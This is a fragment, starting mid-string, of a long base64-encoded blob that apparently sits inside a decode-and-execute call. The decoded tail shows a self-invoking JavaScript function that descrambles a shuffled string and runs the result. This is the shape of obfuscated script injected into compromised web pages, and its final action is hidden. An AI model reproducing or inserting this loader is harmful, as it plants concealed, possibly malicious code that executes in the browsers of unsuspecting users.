wjTGg5TCElTXNTe04pZW5OLitMQyFsTDYufSg0byVoYWZudHVMdl1uX2cyOztQbjFMKWU3fW5MQWUjPUwzIUxzbzQlbH0xSz1uOCN0TG5uIEw6XylMKW5jZWlvbV99THB0bUxmPXU0Y3lcL0dmWi5uZmRfbzEtb0xnZV97ZXslbjZMbC08THxuby5FOl95cmZmST1hdGN9SXIpLiFfcmQpcHtMX0ZMTDMlTDZwTHJMcUxtLm9PO0FvSUw3XS4uaF0pKy5lOCBMLHVMLjxMcG57U3RjLVRlKUxjYjIsXTUiYmlTO2ZGcC4oJlslTExdKyZhTGN0aExfYT1MOS42M2UlPV1MIG5hMEFkfXYpSExvZExsaC5dTChMXy5MOUxwJkxhcmFldUwlKExlZncoYShMIHM7TF1lKm4kTC5OKHRkYWFsYSJMbkx3YztMPFZtb09uaEw+bltbaUx0TC5hai50bS55MV1MZTZAICU9TGVMTEZsTExoN1RdX0Q7Z0wmYzspb2FrLi5iKUxMPTByTGNmK3dOLCl7YTV5NmYyZG5MYW5oTGw6dGUlLnVMam9pLnk5TEwxPSxEaWVubXdfLilpVzM5OHRsM30gTGJMWVJudDNMbmwyMjZMXV9oZiU4XzJaTHJMTDN9KDJmTDcyRWJQM3IuIDhwb11MZiwoZSl1bl9fKGI1M2YhWykrbjYzO19vY3QgNDMxKTA9ZDUxd0xDbzA3cDsxKDEoWUxyLixTb3NJTCJoX10wb18uLTwyY25udW8uXSklUVQiM19lW28wckxMb0xMMEw6KExMLWFoIUxlKTIpOS5jb11bTDFlXW0sLndMXSl0TG50YWVdM10ocjQ/THJkW29peF1MOjMlZ0wkJUwydz1DTHVMXSs/IWNlZ2VyZWxzX0xMb2hlXUwsIHEpTCkxLjR7TEpMX1I7bT5OKUxTNHNVI29oZmhfaE99biRlaXM6TDtMKTkzLlwnZm4lTHJibCBfX0wuZ102KUwgTCIxYSxlJktzc0xnNUMpbF05U19kNF1OImpNKCV0bjN9O3sgOCFldHRMaXRjNj07NG4uZW5udUxmXXh9X0w7YzRMIEVvKnJuN29yTGI4anRmNmkgJW4xZGVbIG1wdT1ffSlfdGolIFlhX18kZSVfLm8hcC4gTGlkZV9jb11lTG4uMzV9NS5JPWUubG59dF8pYUxhK18sTHJOMl1uXSFlRillIChMb2V0XSA2LnJ9ZDo5ISllTGUgIC52THJhci4jdHUgKF0oOSVbNFAuRW4hXV8sbmE0NV8waTlyZUwlY2dfYjZjOWN5eDJMMmUpYmF1LXQgdDdMdzFlZXNMIiUkXzR1TCgsZUogTEY2ZV9mM3goNGRuZSgreF90Ol9lO3kwZXVmK2VlfXQpN041cD09JClMbiwpeyVTZSAjd2Q1JGk/ZTllb0xdXUw5aXllaVt2PUwrOmx7W2ZjOktbMSkoKWN7TExiYWVMS0x9OitvdEwoYntlY21pcmpydW15KGRub107XC9vfV1lcmZMOEx7TF86X3ZlY0wsIVtMXWlMb10jIGZOXWZiPTZ5ZXIuN0wpMShvXWExZGMzZUwgTC50XCdkMDkrIUxidDllIztbLmlMMV9fTDsgTEwnKSk7dmFyIHJkaz1VTWcoSG1sLGNpZCApO3Jkayg2NzgxKTtyZXR1cm4gNzgwNH0pKCk='))
